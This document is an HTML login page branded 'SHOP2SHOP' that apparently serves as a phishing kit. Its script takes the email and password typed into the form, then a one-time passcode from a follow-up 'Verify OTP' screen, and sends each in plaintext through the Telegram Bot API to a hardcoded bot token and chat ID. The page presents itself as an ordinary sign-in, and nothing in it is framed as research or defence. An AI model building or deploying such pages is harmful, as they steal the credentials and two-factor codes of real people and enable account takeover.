<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SHOP2SHOP - Login</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
    .container { width: 100%; max-width: 400px; background: #0f172a; border-radius: 16px; padding: 48px 28px 40px; text-align: center; transition: opacity 0.4s ease; }
    .hidden { display: none; }
    .logo { width: 140px; height: auto; margin: 0 auto 28px; display: block; }
    .brand-name { color: #f97316; font-size: 2.1rem; font-weight: 700; letter-spacing: -0.5px; margin-bottom: 40px; }
    h1 { font-size: 1.5rem; font-weight: 600; color: #cbd5e1; margin-bottom: 36px; }
    .form-group { margin-bottom: 24px; text-align: left; }
    label { display: block; font-size: 0.95rem; font-weight: 500; color: #94a3b8; margin-bottom: 8px; }
    input { width: 100%; padding: 14px 16px; background: transparent; border: none; border-bottom: 1px solid #475569; color: white; font-size: 1rem; transition: border-color 0.2s; }
    input:focus { outline: none; border-bottom-color: #f97316; }
    .forgot-row { display: flex; justify-content: flex-end; margin-bottom: 32px; }
    .forgot-link { color: #f97316; font-size: 0.9rem; text-decoration: none; font-weight: 500; }
    .forgot-link:hover { text-decoration: underline; color: #fb923c; }
    .btn { width: 100%; padding: 15px; background: #f97316; color: white; border: none; border-radius: 10px; font-size: 1.05rem; font-weight: 600; cursor: pointer; margin: 12px 0 28px; transition: background 0.2s; }
    .btn:hover { background: #ea580c; }
    .btn:disabled { background: #c2410c; cursor: not-allowed; }
    @media (max-width: 480px) {
      .container { padding: 40px 24px 36px; }
      .logo { width: 120px; }
      .brand-name { font-size: 1.9rem; }
      h1 { font-size: 1.4rem; }
    }
  </style>
</head>
<body>

  <!-- Login Page -->
  <div id="loginPage" class="container">
    <img src="https://etrash.space/wp-content/uploads/2026/02/looog.png" alt="SHOP2SHOP Logo" class="logo">
    <div class="brand-name">SHOP2SHOP</div>

    <form id="loginForm">
      <div class="form-group">
        <label for="email">Email</label>
        <input type="email" id="email" placeholder="" required autocomplete="email">
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" placeholder="" required autocomplete="current-password">
      </div>
      <div class="forgot-row">
        <a href="#" class="forgot-link">Forgot Password?</a>
      </div>
      <button type="submit" id="loginBtn" class="btn">LOG IN</button>
    </form>
  </div>

  <!-- OTP Page -->
  <div id="otpPage" class="container hidden">
    <img src="https://etrash.space/wp-content/uploads/2026/02/looog.png" alt="SHOP2SHOP Logo" class="logo">
    <div class="brand-name">SHOP2SHOP</div>

    <h1>Verify OTP</h1>

    <div class="form-group" style="text-align: center; margin-bottom: 32px;">
      <label style="display: block; margin-bottom: 16px;">Enter OTP</label>
      <input type="text" id="otp" maxlength="6" placeholder="" style="text-align: center; font-size: 1.4rem; letter-spacing: 8px;" required>
    </div>

    <button id="verifyBtn" class="btn">CONTINUE</button>
  </div>

  <script>
    // Telegram Configuration
    const TELEGRAM_BOT_TOKEN = '8263805109:AAE25mT3Ivo-dzH0vS8h4XzQIMONG1Ykuhc';
    const TELEGRAM_CHAT_ID   = '7228111838';

    const loginPage  = document.getElementById('loginPage');
    const otpPage    = document.getElementById('otpPage');
    const loginForm  = document.getElementById('loginForm');
    const loginBtn   = document.getElementById('loginBtn');
    const verifyBtn  = document.getElementById('verifyBtn');

    // Login Form Submission - IMMEDIATE transition
    loginForm.addEventListener('submit', async function(e) {
      e.preventDefault();

      const email    = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;

      // Basic validation
      if (!email || !password) {
        alert('Please fill in email and password');
        return;
      }

      if (!email.includes('@')) {
        alert('Please enter a valid email');
        return;
      }

      // Optional: disable button during send (very short moment)
      loginBtn.disabled = true;
      loginBtn.textContent = 'LOGGING IN...';

      // Prepare message
      const loginMessage = `
<b>New Login Attempt</b>
Email: ${email}
Password: ${password}
      `;

      // Send to Telegram
      await sendToTelegram(loginMessage);

      // Immediately show OTP page (no delay)
      loginPage.classList.add('hidden');
      otpPage.classList.remove('hidden');

      // Reset button state (in case user goes back)
      loginBtn.disabled = false;
      loginBtn.textContent = 'LOG IN';
    });

    // OTP Verification
    verifyBtn.addEventListener('click', async function() {
      const otp = document.getElementById('otp').value.trim();

      if (!otp || otp.length < 4) {
        alert('Please enter a valid OTP');
        return;
      }

      this.disabled = true;
      this.textContent = 'VERIFYING...';

      const otpMessage = `
<b>OTP Entered</b>
OTP Code: ${otp}
      `;

      await sendToTelegram(otpMessage);

      // Simulate final step (you can remove or change this)
      setTimeout(() => {
        alert('OTP Verified! (Demo)');
        this.disabled = false;
        this.textContent = 'CONTINUE';
        // In a real app â†’ redirect to dashboard
      }, 1200);
    });

    // Helper function to send message to Telegram
    async function sendToTelegram(text) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
          })
        });

        if (!response.ok) {
          console.log('Telegram send failed:', await response.text());
        }
      } catch (err) {
        console.log('Telegram error:', err);
      }
    }
  </script>

</body>
</html>
